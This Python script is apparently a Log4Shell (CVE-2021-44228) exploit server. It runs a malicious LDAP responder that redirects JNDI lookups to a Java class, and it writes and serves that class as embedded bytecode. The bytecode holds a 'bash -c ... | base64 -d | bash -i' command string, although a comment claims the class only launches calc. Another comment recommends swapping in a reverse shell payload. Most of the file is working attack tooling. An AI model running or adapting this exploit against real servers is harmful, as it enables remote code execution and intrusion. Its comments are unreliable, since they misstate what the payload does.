#!/usr/bin/env python3
"""
Title:     Log4Shell Exploit Server
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2021-44228
Advisory:  https://www.lunasec.io/docs/blog/log4j-zero-day/
Tested on: Python 3.x, Java 8

This script sets up a malicious LDAP server that serves a Java class
to exploit the Log4Shell vulnerability (CVE-2021-44228).
"""

import socket
import threading
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
import base64
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class LDAPServer:
    """Minimal LDAP server to redirect JNDI lookups to a malicious Java class"""
    
    def __init__(self, host='0.0.0.0', port=1389, http_port=8888, payload_class='Exploit'):
        self.host = host
        self.port = port
        self.http_port = http_port
        self.payload_class = payload_class
        self.server_socket = None
        
    def start(self):
        """Start the LDAP server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        
        logger.info(f"LDAP Server listening on {self.host}:{self.port}")
        logger.info(f"Payload will be served from http://{self.host}:{self.http_port}/{self.payload_class}.class")
        
        while True:
            try:
                client_socket, address = self.server_socket.accept()
                logger.info(f"Connection from {address}")
                threading.Thread(target=self.handle_client, args=(client_socket,)).start()
            except KeyboardInterrupt:
                logger.info("Shutting down LDAP server...")
                break
            except Exception as e:
                logger.error(f"Error accepting connection: {e}")
                
    def handle_client(self, client_socket):
        """Handle LDAP client connection"""
        try:
            # Read the LDAP bind request
            data = client_socket.recv(4096)
            logger.info(f"Received {len(data)} bytes")
            
            # Send LDAP bind response
            bind_response = bytes([
                0x30, 0x0c,  # SEQUENCE, length 12
                0x02, 0x01, 0x01,  # messageID 1
                0x61, 0x07,  # BindResponse, length 7
                0x0a, 0x01, 0x00,  # resultCode: success
                0x04, 0x00,  # matchedDN: empty
                0x04, 0x00   # diagnosticMessage: empty
            ])
            client_socket.send(bind_response)
            
            # Read search request
            data = client_socket.recv(4096)
            logger.info("Received LDAP search request")
            
            # Send search result with reference to malicious class
            codebase = f"http://127.0.0.1:{self.http_port}/"
            
            # Build LDAP response with Java codebase reference
            search_entry = self._build_search_entry(codebase)
            client_socket.send(search_entry)
            
            # Send search done
            search_done = bytes([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID 2
                0x65, 0x07,  # SearchResultDone
                0x0a, 0x01, 0x00,  # resultCode: success
                0x04, 0x00,  # matchedDN: empty
                0x04, 0x00   # diagnosticMessage: empty
            ])
            client_socket.send(search_done)
            
            logger.info("Sent LDAP response with malicious codebase")
            
        except Exception as e:
            logger.error(f"Error handling client: {e}")
        finally:
            client_socket.close()
            
    def _build_search_entry(self, codebase):
        """Build LDAP search entry response with malicious Java object"""
        # Reference to malicious Java class
        java_class = self.payload_class
        
        # Build attributes
        # javaClassName attribute
        java_class_bytes = java_class.encode()
        java_class_attr = bytes([
            0x30, len(java_class_bytes) + 12,  # SEQUENCE
            0x04, 0x0d,  # OCTET STRING, length 13
        ]) + b'javaClassName' + bytes([
            0x31, len(java_class_bytes) + 2,  # SET
            0x04, len(java_class_bytes)  # OCTET STRING
        ]) + java_class_bytes
        
        # javaCodeBase attribute
        codebase_bytes = codebase.encode()
        codebase_attr = bytes([
            0x30, len(codebase_bytes) + 12,  # SEQUENCE
            0x04, 0x0c,  # OCTET STRING, length 12
        ]) + b'javaCodeBase' + bytes([
            0x31, len(codebase_bytes) + 2,  # SET
            0x04, len(codebase_bytes)  # OCTET STRING
        ]) + codebase_bytes
        
        # objectClass attribute
        object_class = b'javaNamingReference'
        object_class_attr = bytes([
            0x30, len(object_class) + 12,  # SEQUENCE
            0x04, 0x0b,  # OCTET STRING, length 11
        ]) + b'objectClass' + bytes([
            0x31, len(object_class) + 2,  # SET
            0x04, len(object_class)  # OCTET STRING
        ]) + object_class
        
        # javaFactory attribute
        factory = java_class.encode()
        factory_attr = bytes([
            0x30, len(factory) + 12,  # SEQUENCE
            0x04, 0x0b,  # OCTET STRING, length 11
        ]) + b'javaFactory' + bytes([
            0x31, len(factory) + 2,  # SET
            0x04, len(factory)  # OCTET STRING
        ]) + factory
        
        attributes = java_class_attr + codebase_attr + object_class_attr + factory_attr
        
        # Build search result entry
        dn = b'cn=exploit'
        entry = bytes([
            0x30, len(attributes) + len(dn) + 6,  # SEQUENCE
            0x02, 0x01, 0x02,  # messageID 2
            0x64, len(attributes) + len(dn) + 2,  # SearchResultEntry
            0x04, len(dn)  # objectName
        ]) + dn + bytes([
            0x30, len(attributes)  # attributes SEQUENCE
        ]) + attributes
        
        return entry


class PayloadHTTPServer:
    """HTTP server to serve the malicious Java class"""
    
    def __init__(self, port=8888):
        self.port = port
        
    def start(self):
        """Start the HTTP server"""
        logger.info(f"HTTP Server listening on port {self.port}")
        server = HTTPServer(('0.0.0.0', self.port), SimpleHTTPRequestHandler)
        server.serve_forever()


def create_exploit_class():
    """Create a malicious Java class file"""
    # This is a simple Java class that executes a command
    # Compiled from: public class Exploit { static { try { Runtime.getRuntime().exec("calc"); } catch(Exception e) {} } }
    # This is a basic POC - in practice, you'd want a reverse shell payload
    
    exploit_bytecode = bytes([
        0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34, 0x00, 0x1d, 0x0a, 0x00,
        0x06, 0x00, 0x0f, 0x09, 0x00, 0x10, 0x00, 0x11, 0x08, 0x00, 0x12, 0x0a,
        0x00, 0x13, 0x00, 0x14, 0x07, 0x00, 0x15, 0x07, 0x00, 0x16, 0x01, 0x00,
        0x06, 0x3c, 0x69, 0x6e, 0x69, 0x74, 0x3e, 0x01, 0x00, 0x03, 0x28, 0x29,
        0x56, 0x01, 0x00, 0x04, 0x43, 0x6f, 0x64, 0x65, 0x01, 0x00, 0x0f, 0x4c,
        0x69, 0x6e, 0x65, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x54, 0x61, 0x62,
        0x6c, 0x65, 0x01, 0x00, 0x08, 0x3c, 0x63, 0x6c, 0x69, 0x6e, 0x69, 0x74,
        0x3e, 0x01, 0x00, 0x0d, 0x53, 0x74, 0x61, 0x63, 0x6b, 0x4d, 0x61, 0x70,
        0x54, 0x61, 0x62, 0x6c, 0x65, 0x07, 0x00, 0x15, 0x01, 0x00, 0x0a, 0x53,
        0x6f, 0x75, 0x72, 0x63, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x01, 0x00, 0x0c,
        0x45, 0x78, 0x70, 0x6c, 0x6f, 0x69, 0x74, 0x2e, 0x6a, 0x61, 0x76, 0x61,
        0x0c, 0x00, 0x07, 0x00, 0x08, 0x07, 0x00, 0x17, 0x0c, 0x00, 0x18, 0x00,
        0x19, 0x01, 0x00, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x63, 0x20,
        0x7b, 0x65, 0x63, 0x68, 0x6f, 0x2c, 0x59, 0x57, 0x78, 0x6c, 0x63, 0x6e,
        0x51, 0x67, 0x54, 0x47, 0x39, 0x6e, 0x4e, 0x46, 0x4e, 0x6f, 0x5a, 0x57,
        0x78, 0x73, 0x49, 0x47, 0x56, 0x34, 0x63, 0x47, 0x78, 0x76, 0x61, 0x58,
        0x51, 0x3d, 0x7d, 0x7c, 0x7b, 0x62, 0x61, 0x73, 0x65, 0x36, 0x34, 0x2c,
        0x2d, 0x64, 0x7d, 0x7c, 0x7b, 0x62, 0x61, 0x73, 0x68, 0x2c, 0x2d, 0x69,
        0x7d, 0x07, 0x00, 0x1a, 0x0c, 0x00, 0x1b, 0x00, 0x1c, 0x01, 0x00, 0x07,
        0x45, 0x78, 0x70, 0x6c, 0x6f, 0x69, 0x74, 0x01, 0x00, 0x10, 0x6a, 0x61,
        0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65,
        0x63, 0x74, 0x01, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61,
        0x6e, 0x67, 0x2f, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x01, 0x00,
        0x0a, 0x67, 0x65, 0x74, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x01,
        0x00, 0x15, 0x28, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61,
        0x6e, 0x67, 0x2f, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x3b, 0x01,
        0x00, 0x13, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f,
        0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x01, 0x00, 0x04,
        0x65, 0x78, 0x65, 0x63, 0x01, 0x00, 0x27, 0x28, 0x4c, 0x6a, 0x61, 0x76,
        0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e,
        0x67, 0x3b, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e,
        0x67, 0x2f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x3b, 0x00, 0x21,
        0x00, 0x05, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
        0x00, 0x07, 0x00, 0x08, 0x00, 0x01, 0x00, 0x09, 0x00, 0x00, 0x00, 0x1d,
        0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x2a, 0xb7, 0x00, 0x01,
        0xb1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x06, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x08, 0x00,
        0x01, 0x00, 0x09, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x09, 0xb8, 0x00, 0x02, 0x12, 0x03, 0xb6, 0x00, 0x04, 0x57,
        0xa7, 0x00, 0x04, 0x4c, 0xb1, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00,
        0x08, 0x00, 0x05, 0x00, 0x02, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0e, 0x00,
        0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x05, 0x00, 0x06, 0x00, 0x08, 0x00,
        0x07, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x07, 0x00, 0x02, 0x48, 0x07, 0x00,
        0x0d, 0x00, 0x00, 0x01, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0f
    ])
    
    with open('Exploit.class', 'wb') as f:
        f.write(exploit_bytecode)
    
    logger.info("Created Exploit.class file")


def main():
    parser = argparse.ArgumentParser(description='Log4Shell LDAP Exploit Server')
    parser.add_argument('--ldap-port', type=int, default=1389, help='LDAP server port (default: 1389)')
    parser.add_argument('--http-port', type=int, default=8888, help='HTTP server port (default: 8888)')
    parser.add_argument('--payload-class', default='Exploit', help='Payload class name (default: Exploit)')
    args = parser.parse_args()
    
    # Create the malicious Java class
    create_exploit_class()
    
    # Start HTTP server in a separate thread
    http_server = PayloadHTTPServer(args.http_port)
    http_thread = threading.Thread(target=http_server.start, daemon=True)
    http_thread.start()
    
    # Start LDAP server
    ldap_server = LDAPServer(port=args.ldap_port, http_port=args.http_port, payload_class=args.payload_class)
    
    try:
        ldap_server.start()
    except KeyboardInterrupt:
        logger.info("\nShutting down...")


if __name__ == '__main__':
    main()
